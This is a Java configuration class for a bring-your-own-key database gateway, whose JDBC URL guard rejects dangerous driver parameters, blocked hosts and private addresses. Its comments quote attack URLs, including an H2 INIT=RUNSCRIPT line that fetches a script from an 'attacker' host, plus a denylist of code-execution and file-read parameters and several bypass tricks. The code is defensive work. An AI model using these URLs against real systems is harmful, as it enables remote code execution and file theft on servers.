/*
 * Copyright 2024-2026 Embabel Pty Ltd.
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package com.entropy.database.mcp.properties;

import org.springframework.boot.context.properties.ConfigurationProperties;
import org.springframework.boot.context.properties.bind.ConstructorBinding;

import java.io.ByteArrayOutputStream;
import java.nio.charset.StandardCharsets;
import java.time.Duration;
import java.util.ArrayList;
import java.util.LinkedHashSet;
import java.util.List;
import java.util.Locale;
import java.util.Set;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

/**
 * BYOK connection lifecycle configuration.
 * Allows customization of lease duration, max lifetime, and pool settings.
 */
@ConfigurationProperties(prefix = "entropy.mcp.database.byok")
public record ByokProperties(
    Duration leaseDuration,
    Duration maxLifetime,
    Duration cleanupInterval,
    Integer maxCachedConnections,
    Integer poolSize,
    Integer minIdle,
    UrlGuard urlGuard
) {
    /**
     * Annotated explicitly because this record has a second, lifecycle-only constructor: with more
     * than one constructor Spring Boot refuses to guess which one to bind.
     */
    @ConstructorBinding
    public ByokProperties {
        if (leaseDuration == null || leaseDuration.isNegative() || leaseDuration.isZero()) {
            leaseDuration = Duration.ofHours(1);
        }
        if (maxLifetime == null || maxLifetime.isNegative() || maxLifetime.isZero()) {
            // maxLifetime must be strictly greater than leaseDuration; default to 2h
            // to satisfy the constraint while giving ample headroom.
            maxLifetime = Duration.ofHours(2);
        }
        if (cleanupInterval == null || cleanupInterval.isNegative() || cleanupInterval.isZero()) {
            cleanupInterval = Duration.ofMinutes(5);
        }
        if (maxCachedConnections == null || maxCachedConnections <= 0) {
            maxCachedConnections = 100;
        }
        if (poolSize == null || poolSize <= 0) {
            poolSize = 10;
        }
        if (minIdle == null || minIdle <= 0) {
            minIdle = 2;
        }
        if (urlGuard == null) {
            urlGuard = UrlGuard.defaults();
        }
    }

    /**
     * Lifecycle-only constructor, retained so that callers that do not care about the JDBC URL guard
     * keep compiling and transparently get {@link UrlGuard#defaults()}.
     */
    public ByokProperties(Duration leaseDuration,
                          Duration maxLifetime,
                          Duration cleanupInterval,
                          Integer maxCachedConnections,
                          Integer poolSize,
                          Integer minIdle) {
        this(leaseDuration, maxLifetime, cleanupInterval, maxCachedConnections, poolSize, minIdle, null);
    }

    /**
     * Guard rails applied to caller-supplied JDBC URLs before a pool is created.
     *
     * <h2>Why the defaults are asymmetric</h2>
     * This is a BYOK gateway: the caller legitimately owns the database it points us at, so
     * restricting <em>which driver</em> or <em>which host</em> may be reached is deployment policy and
     * defaults to "everything allowed" ({@code allowedDrivers} / {@code blockedHosts} empty,
     * {@code blockPrivateNetworks} false). Turning those on by default would break working
     * connections without closing the actual hole.
     *
     * <p>The actual hole is the <em>parameters</em> of the URL. A JDBC URL is not just an address; for
     * several drivers on this classpath it is also a code/file-access channel:
     * <ul>
     *   <li>{@code jdbc:h2:mem:x;INIT=RUNSCRIPT FROM 'http://attacker/x.sql'} executes attacker SQL at
     *       connect time, and that script can {@code CREATE ALIAS} a Java method - remote code
     *       execution in this JVM;</li>
     *   <li>{@code jdbc:mysql://host/db?allowLoadLocalInfile=true&allowUrlInLocalInfile=true} turns a
     *       rogue MySQL server into an arbitrary-file read of <em>this</em> server;</li>
     *   <li>{@code autoDeserialize}, {@code socketFactory}, {@code queryInterceptors} and
     *       {@code statementInterceptors} all name classes the driver will instantiate or feed data
     *       into.</li>
     * </ul>
     * None of these are needed to talk to a database the caller owns, so
     * {@code rejectDangerousUrlParameters} defaults to {@code true}.
     *
     * @param allowedDrivers               allowed JDBC schemes (the token after {@code jdbc:}, e.g.
     *                                     {@code mysql}); empty means every driver is allowed
     * @param blockedHosts                 hosts that must not be reached; an entry starting with
     *                                     {@code .} or {@code *.} matches by domain suffix; empty
     *                                     means no host is blocked
     * @param blockPrivateNetworks         reject loopback / link-local / RFC1918 literals; defaults to
     *                                     {@code false}
     * @param rejectDangerousUrlParameters reject the code-execution and local-file URL parameters
     *                                     listed above; defaults to {@code true}
     */
    public record UrlGuard(
        List<String> allowedDrivers,
        List<String> blockedHosts,
        Boolean blockPrivateNetworks,
        Boolean rejectDangerousUrlParameters
    ) {
        /**
         * URL parameter keys that hand the caller code execution or local file access.
         * Compared lower-case, and matched for both the {@code ;key=value} and the
         * {@code ?key=value} / {@code &key=value} spelling.
         *
         * <p>H2's {@code FORBID_CREATION} is deliberately absent: it is a hardening switch, not an
         * attack vector, so it stays usable.
         */
        private static final Set<String> DANGEROUS_PARAMETER_KEYS = Set.of(
                // H2: run SQL / scripts at connect time, or write to an attacker-chosen file
                "init", "runscript", "script", "trace_level_file",
                // MySQL: read files off this server, or make it instantiate attacker-named classes
                "allowloadlocalinfile", "allowurlinlocalinfile", "uselocalinfile",
                "autodeserialize", "socketfactory",
                "queryinterceptors", "statementinterceptors",
                "detectcustomcollations", "allowmultiqueries",
                // MySQL 的其余「类名参数」：驱动会 Class.forName + newInstance 这些值，
                // 与 socketFactory 是同一类入口，漏一个就等于黑名单没有意义
                "propertiestransform", "connectionlifecycleinterceptors", "exceptioninterceptors",
                "authenticationplugins", "defaultauthenticationplugin", "clientinfoprovider",
                "serverconfigcachefactory",
                // PostgreSQL（CVE-2022-21724 一族）：全部是「由 URL 指定、由驱动实例化」的类名，
                // loggerFile 则是任意文件写入
                "sslfactory", "sslfactoryarg", "sslhostnameverifier", "sslpasswordcallback",
                "authenticationpluginclassname", "xmlfactoryfactory", "socketfactoryarg", "loggerfile",
                // DB2：这个参数会触发一次 JNDI 查找，等价于远程加载
                "clientrerouteserverlistjndiname");

        /**
         * 通用兜底：以这些词收尾的参数名，在所有 JDBC 驱动里几乎都是「给我一个类名/回调，我来实例化」。
         *
         * <p>只靠逐个补 {@link #DANGEROUS_PARAMETER_KEYS} 的话，换一个驱动或驱动升级出一个新参数就又是一
         * 个洞；按命名兜底可以覆盖还没被公开的同类参数。代价是可能误伤同样以 factory/provider 结尾的良性
         * 参数——但这类参数本来就不该出现在调用方自带的连接串里，宁可报错让部署方显式关闭本开关。
         */
        private static final Set<String> DANGEROUS_KEY_SUFFIXES = Set.of(
                "factory", "interceptor", "interceptors",
                "plugin", "plugins", "provider", "transform");

        /**
         * 形似全限定类名的参数值（至少三段、只含标识符字符），例如 {@code com.evil.Payload}。
         *
         * <p>与 {@link #DANGEROUS_KEY_SUFFIXES} 互补：前者拦「参数名像类名入口」，这里拦「参数值就是一个
         * 类名」。常规参数值（{@code require}、{@code utc}、{@code utf8}、{@code true}）都不满足「三段以上
         * 点分标识符」，所以不会被误伤。
         */
        private static final Pattern FULLY_QUALIFIED_CLASS_NAME =
                Pattern.compile("[a-z_$][\\w$]*(\\.[a-z_$][\\w$]*){2,}");

        /**
         * Substrings that betray an embedded script payload even when it is smuggled inside another
         * parameter's value (H2's {@code INIT=} is exactly that: a SQL statement list).
         */
        private static final Set<String> DANGEROUS_TOKENS = Set.of("runscript", "create alias");

        public UrlGuard {
            allowedDrivers = normalize(allowedDrivers);
            blockedHosts = normalize(blockedHosts);
            if (blockPrivateNetworks == null) {
                blockPrivateNetworks = false;
            }
            if (rejectDangerousUrlParameters == null) {
                // The one guard that is on by default: see the class comment.
                rejectDangerousUrlParameters = true;
            }
        }

        /** Driver and host wide open, dangerous URL parameters rejected. */
        public static UrlGuard defaults() {
            return new UrlGuard(List.of(), List.of(), false, true);
        }

        /**
         * Check a JDBC URL against this policy.
         *
         * @return a violation description naming the offending parameter or host, or {@code null} when
         *         the URL is acceptable. The returned text never embeds the URL itself, because a JDBC
         *         URL frequently carries the password.
         */
        public String findViolation(String jdbcUrl) {
            if (jdbcUrl == null || jdbcUrl.isBlank()) {
                return null;
            }
            String lower = jdbcUrl.toLowerCase(Locale.ROOT);
            // 驱动会把 %xx 解码后才使用参数名，所以只匹配原文的话 "%69nit=..." 就绕过了 init 黑名单。
            // 两种写法都过一遍，而不是只用解码后的形式：解码可能把 URL 里的 %25 之类还原成分隔符，
            // 原文形态仍然是驱动实际会看到的东西。
            String decoded = decodePercentEscapes(lower);

            if (!allowedDrivers.isEmpty()) {
                String scheme = scheme(lower);
                if (scheme == null || !allowedDrivers.contains(scheme)) {
                    return "jdbcUrl driver '" + (scheme == null ? "unknown" : scheme)
                            + "' is not in entropy.mcp.database.byok.url-guard.allowed-drivers";
                }
            }

            if (rejectDangerousUrlParameters) {
                String parameter = findDangerousParameter(lower);
                if (parameter == null && !decoded.equals(lower)) {
                    parameter = findDangerousParameter(decoded);
                }
                if (parameter != null) {
                    return "jdbcUrl contains the forbidden parameter '" + parameter
                            + "': it allows script execution or local file access from the JDBC URL. "
                            + "Remove it, or allow it explicitly via "
                            + "entropy.mcp.database.byok.url-guard.reject-dangerous-url-parameters=false";
                }
            }

            // 一个连接串可以带多个 host（MySQL 的 failover / loadbalance 写法就是逗号分隔），
            // 只校验第一个等于把 "good.example.com,169.254.169.254" 这种绕过方式留在门口。
            for (String host : hostsToCheck(lower, decoded)) {
                if (isBlockedHost(host)) {
                    return "jdbcUrl host '" + host
                            + "' is listed in entropy.mcp.database.byok.url-guard.blocked-hosts";
                }
                if (blockPrivateNetworks && isPrivateNetwork(host)) {
                    return "jdbcUrl host '" + host + "' is a private / loopback address and "
                            + "entropy.mcp.database.byok.url-guard.block-private-networks is enabled";
                }
            }
            return null;
        }

        /** The token between {@code jdbc:} and the next {@code :}, e.g. {@code h2} or {@code mysql}. */
        private static String scheme(String lowerUrl) {
            if (!lowerUrl.startsWith("jdbc:")) {
                return null;
            }
            int end = lowerUrl.indexOf(':', "jdbc:".length());
            if (end < 0) {
                return null;
            }
            String scheme = lowerUrl.substring("jdbc:".length(), end);
            return scheme.isBlank() ? null : scheme;
        }

        private static String findDangerousParameter(String lowerUrl) {
            List<String> segments = splitParameters(lowerUrl);
            for (int i = 0; i < segments.size(); i++) {
                String segment = segments.get(i);
                int equals = segment.indexOf('=');
                String key = (equals >= 0 ? segment.substring(0, equals) : segment).trim();
                if (i == 0) {
                    // 第 0 段是地址部分。DB2 把第一个属性写在库名后面、用 ':' 而不是 ';' 分隔
                    // （jdbc:db2://h:50000/db:clientRerouteServerListJNDIName=...），不看这里就等于漏掉 DB2。
                    // 只检查含 '=' 的分片，也不套用「值形似类名」的启发式：库名、实例名、TNS 描述里出现点分
                    // 名字都是正常的。
                    String embedded = findDangerousKeyInAddress(segment);
                    if (embedded != null) {
                        return embedded;
                    }
                    continue;
                }
                if (DANGEROUS_PARAMETER_KEYS.contains(key)) {
                    return key;
                }
                if (hasDangerousSuffix(key)) {
                    return key;
                }
                if (equals >= 0
                        && FULLY_QUALIFIED_CLASS_NAME.matcher(segment.substring(equals + 1).trim()).matches()) {
                    return key;
                }
            }
            for (String token : DANGEROUS_TOKENS) {
                if (lowerUrl.contains(token)) {
                    return token;
                }
            }
            return null;
        }

        private static String findDangerousKeyInAddress(String addressSegment) {
            for (String chunk : addressSegment.split(":")) {
                int equals = chunk.indexOf('=');
                if (equals < 0) {
                    continue;
                }
                String key = chunk.substring(0, equals).trim();
                if (DANGEROUS_PARAMETER_KEYS.contains(key) || hasDangerousSuffix(key)) {
                    return key;
                }
            }
            return null;
        }

        private static boolean hasDangerousSuffix(String key) {
            for (String suffix : DANGEROUS_KEY_SUFFIXES) {
                // 要求 key 比后缀长，免得把恰好等于 "provider" 这种独立参数名之外的东西也算进来；
                // 等长的情况已经在显式黑名单里覆盖。
                if (key.length() > suffix.length() && key.endsWith(suffix)) {
                    return true;
                }
            }
            return false;
        }

        /**
         * Split off every {@code ;} / {@code ?} / {@code &} separated parameter. The first chunk is the
         * address part and is intentionally kept in the list only to be discarded by the key lookup.
         */
        private static List<String> splitParameters(String lowerUrl) {
            return List.of(lowerUrl.split("[;?&]"));
        }

        /** 原文与解码后两种形态解析出的 host 并集，顺序稳定，便于错误信息可复现。 */
        private static java.util.Collection<String> hostsToCheck(String lowerUrl, String decodedUrl) {
            java.util.Set<String> hosts = new LinkedHashSet<>(hosts(lowerUrl));
            if (!decodedUrl.equals(lowerUrl)) {
                hosts.addAll(hosts(decodedUrl));
            }
            return hosts;
        }

        /**
         * 从各种 JDBC URL 形态里抽出<em>全部</em> host（{@code //host:port/db}、Oracle 的
         * {@code @//host:port/service} 与 {@code @host:port:sid}、MySQL 的
         * {@code (host=...)} 与逗号分隔多主机）。没有网络地址的 URL（H2 内存库、SQLite 文件）返回空集合，
         * 此时 host 策略不适用。
         *
         * <p>三个必须成立的细节，缺一个就会被绕过：
         * <ul>
         *   <li>只在「地址部分」（第一个 {@code ;} 或 {@code ?} 之前）里找 authority。否则参数值里的
         *       {@code 'http://attacker/x.sql'} 会被当成 host；</li>
         *   <li>userinfo 按<em>最后一个</em> {@code @} 剥离。取第一个 {@code @} 会把
         *       {@code app:pw@127.0.0.1} 的用户名当成 host，等于什么都没拦；</li>
         *   <li>{@code [::1]} 这样的 IPv6 字面量要去掉方括号后再判端口，否则截出来的是 {@code [}。</li>
         * </ul>
         */
        private static List<String> hosts(String lowerUrl) {
            int addressEnd = lowerUrl.length();
            for (int i = 0; i < lowerUrl.length(); i++) {
                char c = lowerUrl.charAt(i);
                if (c == ';' || c == '?') {
                    addressEnd = i;
                    break;
                }
            }
            String address = lowerUrl.substring(0, addressEnd);

            int start;
            int slashes = address.indexOf("//");
            if (slashes >= 0) {
                start = slashes + 2;
            } else {
                int at = address.indexOf('@');
                if (at < 0) {
                    return List.of();
                }
                start = at + 1;
            }
            int end = address.length();
            for (int i = start; i < address.length(); i++) {
                if (address.charAt(i) == '/') {
                    end = i;
                    break;
                }
            }
            String authority = address.substring(start, end);
            int credentials = authority.lastIndexOf('@');
            if (credentials >= 0) {
                authority = authority.substring(credentials + 1);
            }

            List<String> hosts = new ArrayList<>();
            for (String entry : authority.split(",")) {
                String candidate = entry.trim();
                if (candidate.isEmpty()) {
                    continue;
                }
                Matcher embedded = EMBEDDED_HOST.matcher(candidate);
                boolean matched = false;
                while (embedded.find()) {
                    matched = true;
                    addHost(hosts, embedded.group(1));
                }
                if (!matched) {
                    addHost(hosts, candidate);
                }
            }
            return List.copyOf(hosts);
        }

        /** MySQL/Oracle 的键值式地址写法，例如 {@code address=(host=169.254.169.254)(port=3306)}。 */
        private static final Pattern EMBEDDED_HOST = Pattern.compile("host\\s*=\\s*([^),;\\s]+)");

        private static void addHost(List<String> hosts, String hostAndPort) {
            String host = stripPort(hostAndPort.trim());
            if (!host.isEmpty()) {
                hosts.add(host);
            }
        }

        /** 去掉端口/实例名后缀；{@code [ipv6]} 先脱括号，否则会在第一个冒号处被切断。 */
        private static String stripPort(String hostAndPort) {
            if (hostAndPort.startsWith("[")) {
                int close = hostAndPort.indexOf(']');
                return close > 0 ? hostAndPort.substring(1, close) : hostAndPort.substring(1);
            }
            int end = hostAndPort.length();
            for (int i = 0; i < hostAndPort.length(); i++) {
                char c = hostAndPort.charAt(i);
                if (c == ':' || c == '\\') {
                    end = i;
                    break;
                }
            }
            return hostAndPort.substring(0, end);
        }

        private boolean isBlockedHost(String host) {
            for (String candidate : comparableForms(host)) {
                for (String blocked : blockedHosts) {
                    if (blocked.startsWith("*.")) {
                        String suffix = blocked.substring(1);
                        if (candidate.equals(blocked.substring(2)) || candidate.endsWith(suffix)) {
                            return true;
                        }
                    } else if (blocked.startsWith(".")) {
                        if (candidate.endsWith(blocked) || candidate.equals(blocked.substring(1))) {
                            return true;
                        }
                    } else if (candidate.equals(blocked)) {
                        return true;
                    }
                }
            }
            return false;
        }

        /**
         * 用于黑名单比对的等价写法：去掉 FQDN 尾点，并把 {@code 127.1} / {@code 2130706433} /
         * {@code 0x7f.0.0.1} 这类合法但非点分四段的 IPv4 还原成规范形式——驱动和 {@code InetAddress}
         * 都认这些写法，黑名单如果只认字面量就形同虚设。
         */
        private static List<String> comparableForms(String host) {
            String bare = stripTrailingDot(host);
            Long bits = canonicalIpv4Bits(bare);
            if (bits == null) {
                return List.of(bare);
            }
            String canonical = ((bits >> 24) & 0xff) + "." + ((bits >> 16) & 0xff)
                    + "." + ((bits >> 8) & 0xff) + "." + (bits & 0xff);
            return canonical.equals(bare) ? List.of(bare) : List.of(bare, canonical);
        }

        private static String stripTrailingDot(String host) {
            // "localhost." 与 "localhost" 解析到同一个地址，尾点是合法的 FQDN 写法。
            return host.endsWith(".") && host.length() > 1 ? host.substring(0, host.length() - 1) : host;
        }

        /**
         * Literal-only private network detection. Deliberately no DNS resolution: a lookup here would
         * add network latency to every connection registration and could itself be steered by the
         * caller.
         *
         * <p>判定前先规范化：{@code 127.1}、{@code 2130706433}、{@code 0x7f.0.0.1} 都是
         * {@code inet_aton} 接受的 127.0.0.1 写法。数字形态但无法规范化（段值越界、超长）的输入按「可疑」
         * 处理并在开关打开时拒绝——这类字符串没有正当用途，放过去的风险高于误拒。
         */
        private static boolean isPrivateNetwork(String host) {
            String bare = stripTrailingDot(host);
            if (bare.isEmpty()) {
                return false;
            }
            // RFC 6761：localhost 及 .localhost 子域按约定必须解析到回环。
            if (bare.equals("localhost") || bare.endsWith(".localhost")) {
                return true;
            }
            if (bare.indexOf(':') >= 0 || bare.startsWith("[")) {
                return isPrivateIpv6(bare);
            }
            Long bits = canonicalIpv4Bits(bare);
            if (bits == null) {
                return looksNumericHost(bare);
            }
            return isPrivateIpv4(bits);
        }

        private static boolean isPrivateIpv4(long bits) {
            int first = (int) ((bits >> 24) & 0xff);
            int second = (int) ((bits >> 16) & 0xff);
            return first == 10
                    || first == 127
                    || first == 0
                    || (first == 172 && second >= 16 && second <= 31)
                    || (first == 192 && second == 168)
                    || (first == 169 && second == 254);
        }

        private static boolean isPrivateIpv6(String host) {
            String v6 = host;
            if (v6.startsWith("[")) {
                int close = v6.indexOf(']');
                v6 = close > 0 ? v6.substring(1, close) : v6.substring(1);
            }
            // IPv4-mapped / -embedded 形式（::ffff:127.0.0.1）按内嵌的 IPv4 判定
            int lastColon = v6.lastIndexOf(':');
            if (lastColon >= 0 && v6.indexOf('.', lastColon) > 0) {
                Long embedded = canonicalIpv4Bits(v6.substring(lastColon + 1));
                if (embedded != null) {
                    return isPrivateIpv4(embedded);
                }
            }
            if (v6.startsWith("fc") || v6.startsWith("fd")           // unique-local fc00::/7
                    || v6.startsWith("fe8") || v6.startsWith("fe9")  // link-local fe80::/10
                    || v6.startsWith("fea") || v6.startsWith("feb")) {
                return true;
            }
            // ::1 / 0:0:0:0:0:0:0:1 / :: 都要按回环或未指定地址拦下
            String digits = v6.replace(":", "").replaceFirst("^0+", "");
            return digits.isEmpty() || digits.equals("1");
        }

        /**
         * {@code inet_aton} 语义的 IPv4 解析：1~4 段，每段可以是十进制、{@code 0x} 十六进制或前导 0 的
         * 八进制，最后一段吃掉剩余的所有字节。返回 32 位地址，无法解析成 IPv4 时返回 {@code null}。
         */
        private static Long canonicalIpv4Bits(String host) {
            String[] parts = host.split("\\.", -1);
            if (parts.length == 0 || parts.length > 4) {
                return null;
            }
            long[] values = new long[parts.length];
            for (int i = 0; i < parts.length; i++) {
                Long value = parseIpv4Part(parts[i]);
                if (value == null) {
                    return null;
                }
                values[i] = value;
            }
            int leading = values.length - 1;
            long last = values[leading];
            if (last < 0 || last >= (1L << (8 * (4 - leading)))) {
                return null;
            }
            long bits = last;
            for (int i = 0; i < leading; i++) {
                if (values[i] > 255) {
                    return null;
                }
                bits |= values[i] << (8 * (3 - i));
            }
            return bits;
        }

        private static Long parseIpv4Part(String part) {
            if (part.isEmpty()) {
                return null;
            }
            try {
                if (part.startsWith("0x")) {
                    return part.length() > 2 ? Long.parseLong(part.substring(2), 16) : null;
                }
                if (part.length() > 1 && part.charAt(0) == '0') {
                    return Long.parseLong(part.substring(1), 8);
                }
                return Long.parseLong(part, 10);
            } catch (NumberFormatException e) {
                return null;
            }
        }

        /** 每一段都是纯数字或 {@code 0x} 十六进制：像 IP 却规范化失败，按可疑处理。 */
        private static boolean looksNumericHost(String host) {
            for (String part : host.split("\\.", -1)) {
                if (part.isEmpty() || !NUMERIC_HOST_PART.matcher(part).matches()) {
                    return false;
                }
            }
            return true;
        }

        private static final Pattern NUMERIC_HOST_PART = Pattern.compile("0x[0-9a-f]+|[0-9]+");

        /**
         * 就地解码 {@code %xx}，不把 {@code +} 当空格（JDBC URL 不是表单编码）。无法识别的 {@code %}
         * 原样保留，保证解码永不抛异常、也不会凭空造出分隔符。
         */
        private static String decodePercentEscapes(String value) {
            if (value.indexOf('%') < 0) {
                return value;
            }
            ByteArrayOutputStream out = new ByteArrayOutputStream(value.length());
            for (int i = 0; i < value.length(); i++) {
                char c = value.charAt(i);
                if (c == '%' && i + 2 < value.length()) {
                    int high = Character.digit(value.charAt(i + 1), 16);
                    int low = Character.digit(value.charAt(i + 2), 16);
                    if (high >= 0 && low >= 0) {
                        out.write((high << 4) + low);
                        i += 2;
                        continue;
                    }
                }
                out.writeBytes(String.valueOf(c).getBytes(StandardCharsets.UTF_8));
            }
            return out.toString(StandardCharsets.UTF_8);
        }

        /** Lower-cased, blank-free, immutable copy; {@code null} becomes an empty list. */
        private static List<String> normalize(List<String> values) {
            if (values == null || values.isEmpty()) {
                return List.of();
            }
            return values.stream()
                    .filter(value -> value != null && !value.isBlank())
                    .map(value -> value.trim().toLowerCase(Locale.ROOT))
                    .toList();
        }
    }
}
